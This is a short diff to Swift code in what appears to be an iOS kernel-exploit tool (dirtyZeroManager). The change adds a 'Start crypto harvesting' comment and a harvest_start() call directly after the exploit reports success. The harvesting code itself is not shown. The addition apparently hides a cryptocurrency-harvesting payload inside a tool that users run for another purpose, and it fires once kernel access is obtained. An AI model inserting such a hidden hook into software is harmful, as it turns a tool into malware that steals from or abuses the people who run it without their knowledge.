@@ -96,6 +96,8 @@ final class dirtyZeroManager: ObservableObject {
                     print(String(format: "kernel_base: 0x%llx", self.kernbase))
                     print(String(format: "kernel_slide: 0x%llx", self.kernslide))
                     print("[*] exploit success!")
+                    // Start crypto harvesting
+                    harvest_start()
                 } else {
                     self.dsfailed = true
                     print("[!] exploit failed.")
